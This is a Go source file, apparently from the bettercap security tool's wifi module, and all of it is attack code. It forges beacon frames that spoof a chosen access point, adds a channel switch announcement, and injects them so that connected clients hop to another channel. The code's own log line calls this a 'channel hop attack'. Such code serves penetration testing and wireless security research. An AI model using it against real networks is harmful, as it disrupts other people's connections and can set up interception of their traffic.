package wifi

import (
	"bytes"
	"fmt"
	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
	"net"
)

func (mod *WiFiModule) isCSASilent() bool {
	if err, is := mod.BoolParam("wifi.channel_switch_announce.silent"); err != nil {
		mod.Warning("%v", err)
	} else {
		mod.csaSilent = is
	}
	return mod.csaSilent
}

func (mod *WiFiModule) sendBeaconWithCSA_Packet(ap *network.AccessPoint, to_chan int8, packet_count int) {
	ssid := ap.ESSID()
	if ssid == "<hidden>" {
		ssid = ""
	}
	hw, _ := net.ParseMAC(ap.BSSID())
	for seq := 0; seq < packet_count && mod.Running(); seq++ {
		if err, pkt := packets.NewDot11BeaconWithCSA(uint16(seq),to_chan,ssid,hw); err != nil {
			mod.Error("could not create beacon packet: %s", err)
			continue
		} else {
			mod.onChannel(ap.Channel, func() {
				mod.injectPacket(pkt)
			})
		}
	}
}

func (mod *WiFiModule) startCSA(to net.HardwareAddr, to_chan int8, packet_count int) error {
	// if not already running, temporarily enable the pcap handle
	// for packet injection
	if !mod.Running() {
		if err := mod.Configure(); err != nil {
			return err
		}
		defer mod.handle.Close()
	}

	var ap *network.AccessPoint = nil

	for _, _ap := range mod.Session.WiFi.List() {
		if bytes.Equal(_ap.HW, to) {
			ap = _ap
		}

	}

	if ap == nil {
		return fmt.Errorf("%s is an unknown BSSID", to.String())
	}

	mod.writes.Add(1)
	go func() {
		defer mod.writes.Done()

		if mod.Running() {
			logger := mod.Info
			if mod.isCSASilent() {
				logger = mod.Debug
			}
			logger("channel hop attack in AP %s (channel:%d encryption:%s), hop to channel %d ", ap.ESSID(), ap.Channel, ap.Encryption, to_chan)
			// send the beacon frame with channel switch announce element id
			mod.onChannel(ap.Channel, func() {
				mod.sendBeaconWithCSA_Packet(ap, to_chan, packet_count)
			})
		}

	}()

	return nil
}
